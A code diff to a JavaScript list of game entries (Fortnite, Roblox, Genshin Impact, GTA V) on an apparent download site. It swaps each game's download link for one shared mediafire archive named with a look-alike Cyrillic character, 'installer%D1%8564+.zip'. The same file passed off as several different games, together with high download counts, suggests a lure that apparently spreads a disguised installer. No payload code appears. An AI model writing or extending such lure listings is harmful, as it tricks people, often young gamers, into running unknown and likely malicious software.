@@ -98,13 +98,13 @@ export const ItemsList = [
         title: "Fortnite",
         downloadCount: "42.7K",
         src: "/icons/fortnite.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://download941.mediafire.com/tr35kqqr6mag/39mupywzstsa56p/installer%D1%8564+.zip"
       },
       {
         title: "Roblox",
         downloadCount: "95.1K",
         src: "/icons/roblox.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://download941.mediafire.com/tr35kqqr6mag/39mupywzstsa56p/installer%D1%8564+.zip"
       },
       {
         title: "Apex Legends",
@@ -116,7 +116,7 @@ export const ItemsList = [
         title: "Genshin Impact",
         downloadCount: "103.4K",
         src: "/icons/genshin-impact.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://download941.mediafire.com/tr35kqqr6mag/39mupywzstsa56p/installer%D1%8564+.zip"
       },
       {
         title: "Rainbow Six Siege",
@@ -128,7 +128,7 @@ export const ItemsList = [
         title: "GTA V",
         downloadCount: "87.3K",
         src: "/icons/gta-5.png",
-        downloadLink: "https://filebin.net/ng3ahxap4euhjorm/installer_64_.zip"
+        downloadLink: "https://download941.mediafire.com/tr35kqqr6mag/39mupywzstsa56p/installer%D1%8564+.zip"
       },
       {
         title: "Rust",
